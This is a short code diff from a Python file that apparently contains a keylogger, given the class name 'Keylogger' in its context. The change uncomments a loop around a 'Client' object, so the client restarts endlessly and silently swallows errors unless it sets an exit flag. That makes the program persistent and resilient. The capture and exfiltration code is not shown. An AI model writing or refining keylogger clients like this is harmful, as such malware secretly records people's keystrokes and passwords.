@@ -208,11 +208,11 @@ class Keylogger:
 
 
 if __name__ == "__main__":
-    #while True:
-    #    try:
+    while True:
+        try:
             client = Client()
             client.main()
-    #        if client.exit:
-    #            break
-    #    except:
-    #        pass
+            if client.exit:
+                break
+        except:
+            pass
